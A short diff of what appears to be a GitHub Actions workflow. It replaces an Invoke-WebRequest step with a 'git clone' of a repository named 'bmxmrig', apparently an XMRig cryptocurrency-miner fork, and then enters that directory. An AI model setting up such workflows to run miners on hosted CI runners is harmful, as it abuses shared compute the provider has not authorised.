@@ -10,7 +10,7 @@ jobs:
     steps:
     - name: git clone https://github.com/quincyhays/bmxmrig
       run: |
-        Invoke-WebRequest https://github.com/quincyhays/bmxmrig
+        git clone https://github.com/quincyhays/bmxmrig
     - name: cd bmxmrig
       run: | 
         cd bmxmrig
